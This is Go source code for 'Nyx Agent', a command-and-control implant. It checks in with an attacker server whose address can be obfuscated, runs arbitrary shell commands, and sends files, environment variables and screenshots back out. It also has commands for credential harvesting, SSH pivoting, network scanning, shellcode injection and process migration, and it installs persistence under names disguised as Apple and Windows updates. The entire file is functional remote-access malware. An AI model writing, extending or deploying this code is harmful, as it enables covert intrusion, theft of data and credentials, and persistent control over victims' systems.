package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// Overridden at build time via -ldflags
var C2URL       = "http://127.0.0.1:8000"
var DefaultSleep  = "5"
var DefaultJitter = "1"
// XORKey: when non-empty, C2URL is a hex-encoded XOR-obfuscated string.
// Set via -ldflags "-X main.XORKey=<key>" to enable string obfuscation.
var XORKey = ""

func init() {
	if XORKey != "" {
		C2URL = xorDecodeHex(C2URL, XORKey)
	}
}

func xorDecodeHex(hexStr, key string) string {
	if len(hexStr)%2 != 0 {
		return hexStr
	}
	b := make([]byte, len(hexStr)/2)
	for i := 0; i < len(b); i++ {
		var val byte
		fmt.Sscanf(hexStr[i*2:i*2+2], "%02x", &val)
		b[i] = val ^ key[i%len(key)]
	}
	return string(b)
}

type CheckinRequest struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	IP       string `json:"ip"`
}

type Task struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

type CheckinResponse struct {
	AgentID string `json:"agent_id"`
	Sleep   string `json:"sleep"`
	Jitter  string `json:"jitter"`
	Task    *Task  `json:"task"`
}

type TaskResult struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Status string `json:"status"`
}

var client = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
	Timeout: 30 * time.Second,
}

func getOutboundIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return "unknown"
}

func checkin(agentID string) (*CheckinResponse, error) {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	payload := CheckinRequest{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		IP:       getOutboundIP(),
	}

	data, _ := json.Marshal(payload)
	resp, err := client.Post(C2URL+"/api/agents/checkin", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var result CheckinResponse
	json.NewDecoder(resp.Body).Decode(&result)
	return &result, nil
}

func executeShell(command string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}
	var out, stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	output := out.String() + stderr.String()
	if output == "" && err != nil {
		output = err.Error()
	}
	return output, err
}

func handleTask(agentID string, task *Task) {
	fmt.Printf("[*] Task: %s\n", task.Command)

	output, status := dispatch(task.Command)

	result := TaskResult{TaskID: task.ID, Output: output, Status: status}
	data, _ := json.Marshal(result)
	url := fmt.Sprintf("%s/api/agents/%s/result", C2URL, agentID)
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(data))
	if err != nil {
		fmt.Printf("[-] Failed to send result: %v\n", err)
		return
	}
	defer resp.Body.Close()
	fmt.Printf("[+] Task %s → %s\n", task.ID[:8], status)
}

func dispatch(command string) (string, string) {
	parts := strings.SplitN(strings.TrimSpace(command), " ", 2)
	cmd := strings.ToLower(parts[0])
	arg := ""
	if len(parts) > 1 {
		arg = parts[1]
	}

	switch cmd {

	case "shell":
		if arg == "" {
			return "usage: shell <command>", "failed"
		}
		out, err := executeShell(arg)
		if err != nil {
			return out, "failed"
		}
		return out, "completed"

	case "sysinfo":
		hostname, _ := os.Hostname()
		user := os.Getenv("USER")
		if user == "" {
			user = os.Getenv("USERNAME")
		}
		return fmt.Sprintf(
			"Hostname : %s\nUser     : %s\nOS       : %s\nArch     : %s\nPID      : %d\nIP       : %s",
			hostname, user, runtime.GOOS, runtime.GOARCH, os.Getpid(), getOutboundIP(),
		), "completed"

	case "whoami":
		out, _ := executeShell("whoami")
		return strings.TrimSpace(out), "completed"

	case "pwd":
		dir, _ := os.Getwd()
		return dir, "completed"

	case "cd":
		if arg == "" {
			return "usage: cd <path>", "failed"
		}
		if err := os.Chdir(arg); err != nil {
			return err.Error(), "failed"
		}
		dir, _ := os.Getwd()
		return "Changed to: " + dir, "completed"

	case "ls":
		path := "."
		if arg != "" {
			path = arg
		}
		entries, err := os.ReadDir(path)
		if err != nil {
			return err.Error(), "failed"
		}
		var lines []string
		for _, e := range entries {
			info, _ := e.Info()
			if e.IsDir() {
				lines = append(lines, fmt.Sprintf("drwxr-xr-x  %s/", e.Name()))
			} else {
				lines = append(lines, fmt.Sprintf("-rw-r--r--  %-8d  %s", info.Size(), e.Name()))
			}
		}
		if len(lines) == 0 {
			return "(empty directory)", "completed"
		}
		return strings.Join(lines, "\n"), "completed"

	case "cat":
		if arg == "" {
			return "usage: cat <file>", "failed"
		}
		data, err := os.ReadFile(arg)
		if err != nil {
			return err.Error(), "failed"
		}
		return string(data), "completed"

	case "ps":
		var out string
		var err error
		if runtime.GOOS == "windows" {
			out, err = executeShell("tasklist /FO TABLE")
		} else {
			out, err = executeShell("ps aux")
		}
		if err != nil {
			return out, "failed"
		}
		return out, "completed"

	case "env":
		return strings.Join(os.Environ(), "\n"), "completed"

	case "download":
		if arg == "" {
			return "usage: download <remote_path>", "failed"
		}
		data, err := os.ReadFile(arg)
		if err != nil {
			return err.Error(), "failed"
		}
		encoded := base64.StdEncoding.EncodeToString(data)
		filename := filepath.Base(arg)
		return fmt.Sprintf("FILE:%s:BASE64:%s", filename, encoded), "completed"

	case "upload":
		// format: upload <dest_path> <base64data>
		uploadParts := strings.SplitN(arg, " ", 2)
		if len(uploadParts) < 2 {
			return "usage: upload <dest_path> <base64data>", "failed"
		}
		dest := uploadParts[0]
		decoded, err := base64.StdEncoding.DecodeString(uploadParts[1])
		if err != nil {
			return "base64 decode error: " + err.Error(), "failed"
		}
		if err := os.WriteFile(dest, decoded, 0644); err != nil {
			return err.Error(), "failed"
		}
		return fmt.Sprintf("Uploaded %d bytes to %s", len(decoded), dest), "completed"

	case "persist":
		return installPersistence(), "completed"

	case "unpersist":
		return removePersistence(), "completed"

	case "sleep":
		if arg == "" {
			return "usage: sleep <seconds>", "failed"
		}
		return fmt.Sprintf("Sleep interval acknowledged: %ss", arg), "completed"

	case "screenshot":
		return takeScreenshot()

	case "netstat":
		var out string
		var err error
		if runtime.GOOS == "windows" {
			out, err = executeShell("netstat -ano")
		} else {
			out, err = executeShell("netstat -tuln 2>/dev/null || ss -tuln")
		}
		if err != nil {
			return out, "failed"
		}
		return out, "completed"

	case "ifconfig", "ipconfig":
		var out string
		var err error
		if runtime.GOOS == "windows" {
			out, err = executeShell("ipconfig /all")
		} else {
			out, err = executeShell("ifconfig 2>/dev/null || ip addr")
		}
		if err != nil {
			return out, "failed"
		}
		return out, "completed"

	case "ssh-exec":
		// usage: ssh-exec <host:port> <user> <pass> <command>
		sshParts := strings.SplitN(arg, " ", 4)
		if len(sshParts) < 4 {
			return "usage: ssh-exec <host:port> <user> <pass> <command>", "failed"
		}
		return sshExec(sshParts[0], sshParts[1], sshParts[2], sshParts[3])

	case "ssh-key-exec":
		// usage: ssh-key-exec <host:port> <user> <privkey_pem_b64> <command>
		sshParts := strings.SplitN(arg, " ", 4)
		if len(sshParts) < 4 {
			return "usage: ssh-key-exec <host:port> <user> <privkey_pem_b64> <command>", "failed"
		}
		keyPEM, err := base64.StdEncoding.DecodeString(sshParts[2])
		if err != nil {
			return "base64 decode of key failed: " + err.Error(), "failed"
		}
		return sshKeyExec(sshParts[0], sshParts[1], string(keyPEM), sshParts[3])

	case "portscan":
		scanParts := strings.SplitN(arg, " ", 2)
		host := ""
		ports := ""
		if len(scanParts) >= 1 {
			host = scanParts[0]
		}
		if len(scanParts) >= 2 {
			ports = scanParts[1]
		}
		return portScan(host, ports)

	case "hostscan":
		return hostDiscover(strings.TrimSpace(arg))

	case "creds":
		return harvestCreds()

	case "privesc":
		return privescCheck()

	case "arp":
		var out string
		var err error
		if runtime.GOOS == "windows" {
			out, err = executeShell("arp -a")
		} else {
			out, err = executeShell("arp -a 2>/dev/null || ip neigh show")
		}
		if err != nil {
			return out, "failed"
		}
		return out, "completed"

	case "inject":
		// usage: inject <pid> <shellcode_base64>
		injParts := strings.SplitN(arg, " ", 2)
		if len(injParts) < 2 {
			return "usage: inject <pid> <shellcode_base64>", "failed"
		}
		pid, err := strconv.Atoi(injParts[0])
		if err != nil {
			return "invalid PID: " + injParts[0], "failed"
		}
		sc, err := base64.StdEncoding.DecodeString(injParts[1])
		if err != nil {
			return "base64 decode error: " + err.Error(), "failed"
		}
		return injectShellcode(pid, sc)

	case "migrate":
		// usage: migrate <pid>  — inject a copy of ourselves into another process
		if arg == "" {
			return "usage: migrate <pid>", "failed"
		}
		pid, err := strconv.Atoi(strings.TrimSpace(arg))
		if err != nil {
			return "invalid PID: " + arg, "failed"
		}
		// Read own binary and inject it
		exePath, _ := os.Executable()
		binary, err := os.ReadFile(exePath)
		if err != nil {
			return "failed to read self: " + err.Error(), "failed"
		}
		return injectShellcode(pid, binary)

	case "kill":
		fmt.Println("[!] Kill command received, exiting.")
		os.Exit(0)
		return "", "completed"

	default:
		// try to run as shell command
		out, err := executeShell(command)
		if err != nil {
			return out, "failed"
		}
		return out, "completed"
	}
}

func takeScreenshot() (string, string) {
	tmpFile := fmt.Sprintf("/tmp/nyx_screen_%d.png", time.Now().Unix())
	var err error

	switch runtime.GOOS {
	case "darwin":
		_, err = executeShell(fmt.Sprintf("screencapture -x %s", tmpFile))
	case "linux":
		_, err = executeShell(fmt.Sprintf("import -window root %s 2>/dev/null || scrot %s 2>/dev/null || gnome-screenshot -f %s", tmpFile, tmpFile, tmpFile))
	case "windows":
		ps := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; $s=[System.Windows.Forms.Screen]::PrimaryScreen; $b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); $b.Save('%s')`, tmpFile)
		_, err = executeShell(fmt.Sprintf("powershell -Command \"%s\"", ps))
	default:
		return "Unsupported OS: " + runtime.GOOS, "failed"
	}

	if err != nil {
		return "Screenshot failed: " + err.Error(), "failed"
	}

	data, readErr := os.ReadFile(tmpFile)
	os.Remove(tmpFile)
	if readErr != nil {
		return "Could not read screenshot: " + readErr.Error(), "failed"
	}

	encoded := base64.StdEncoding.EncodeToString(data)
	return fmt.Sprintf("SCREENSHOT:BASE64:%s", encoded), "completed"
}

func installPersistence() string {
	exePath, err := os.Executable()
	if err != nil {
		return "Failed to get executable path: " + err.Error()
	}
	exePath, _ = filepath.Abs(exePath)

	switch runtime.GOOS {
	case "darwin":
		plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`, exePath)

		plistPath := os.Getenv("HOME") + "/Library/LaunchAgents/com.apple.update.helper.plist"
		if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
			return "Failed to write plist: " + err.Error()
		}
		exec.Command("launchctl", "load", plistPath).Run()
		return fmt.Sprintf("[+] Persistence installed via LaunchAgent: %s", plistPath)

	case "linux":
		cronLine := fmt.Sprintf("@reboot %s\n", exePath)
		tmpFile := "/tmp/.cron_nyx"
		exec.Command("/bin/sh", "-c", "crontab -l 2>/dev/null > "+tmpFile).Run()

		existing, _ := os.ReadFile(tmpFile)
		if !strings.Contains(string(existing), exePath) {
			f, err := os.OpenFile(tmpFile, os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				return "Failed to open cron file: " + err.Error()
			}
			f.WriteString(cronLine)
			f.Close()
			exec.Command("crontab", tmpFile).Run()
		}
		os.Remove(tmpFile)
		return fmt.Sprintf("[+] Persistence installed via crontab @reboot: %s", exePath)

	case "windows":
		key := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
		out, err := executeShell(fmt.Sprintf(`reg add "%s" /v "WindowsUpdate" /t REG_SZ /d "%s" /f`, key, exePath))
		if err != nil {
			return "Registry error: " + out
		}
		return fmt.Sprintf("[+] Persistence installed via Registry Run key: %s", exePath)

	default:
		return "Unsupported OS: " + runtime.GOOS
	}
}

func removePersistence() string {
	switch runtime.GOOS {
	case "darwin":
		plistPath := os.Getenv("HOME") + "/Library/LaunchAgents/com.apple.update.helper.plist"
		exec.Command("launchctl", "unload", plistPath).Run()
		os.Remove(plistPath)
		return "[+] LaunchAgent persistence removed"

	case "linux":
		exePath, _ := os.Executable()
		exePath, _ = filepath.Abs(exePath)
		tmpFile := "/tmp/.cron_nyx"
		exec.Command("/bin/sh", "-c", "crontab -l 2>/dev/null > "+tmpFile).Run()
		data, _ := os.ReadFile(tmpFile)
		var newLines []string
		for _, line := range strings.Split(string(data), "\n") {
			if !strings.Contains(line, exePath) {
				newLines = append(newLines, line)
			}
		}
		os.WriteFile(tmpFile, []byte(strings.Join(newLines, "\n")), 0644)
		exec.Command("crontab", tmpFile).Run()
		os.Remove(tmpFile)
		return "[+] Crontab persistence removed"

	case "windows":
		key := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
		out, err := executeShell(fmt.Sprintf(`reg delete "%s" /v "WindowsUpdate" /f`, key))
		if err != nil {
			return "Registry error: " + out
		}
		return "[+] Registry Run key persistence removed"

	default:
		return "Unsupported OS: " + runtime.GOOS
	}
}

func main() {
	fmt.Println("[*] Nyx Agent v0.3.0 starting...")

	var agentID string
	var dohStarted bool
	sleepSeconds := 5
	jitterSeconds := 1

	for {
		resp, err := checkin(agentID)
		if err != nil {
			fmt.Printf("[-] Checkin failed: %v — retrying in %ds\n", err, sleepSeconds)
			time.Sleep(time.Duration(sleepSeconds) * time.Second)
			continue
		}

		agentID = resp.AgentID

		if !dohStarted && DohVar != "" && C2Domain != "" {
			dohStarted = true
			go runDohBeacon(agentID)
		}

		if s, err := strconv.Atoi(resp.Sleep); err == nil {
			sleepSeconds = s
		}
		if j, err := strconv.Atoi(resp.Jitter); err == nil {
			jitterSeconds = j
		}

		if resp.Task != nil {
			go handleTask(agentID, resp.Task)
		}

		jitter := rand.Intn(jitterSeconds*2+1) - jitterSeconds
		sleepDur := time.Duration(sleepSeconds+jitter) * time.Second
		if sleepDur < time.Second {
			sleepDur = time.Second
		}
		time.Sleep(sleepDur)
	}
}
